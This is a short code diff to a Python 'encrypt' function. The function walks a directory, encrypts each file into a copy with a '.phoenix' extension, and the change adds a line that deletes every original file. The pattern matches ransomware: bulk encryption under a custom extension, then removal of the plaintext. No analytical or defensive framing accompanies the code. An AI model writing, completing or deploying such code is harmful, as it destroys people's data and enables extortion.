@@ -8,7 +8,6 @@ def encrypt(directory):
 
     for root, dirs, files in os.walk(directory):
         for file in files:
-
             with open(os.path.join(root, file), 'rb') as f:
                 data = f.read()
 
@@ -21,6 +20,9 @@ def encrypt(directory):
 
             with open(os.path.join(root, file) + '.phoenix', 'wb') as f:
                 f.write(encrypted_data)
+
+            os.remove(os.path.join(root, file))
+
                 
 
 
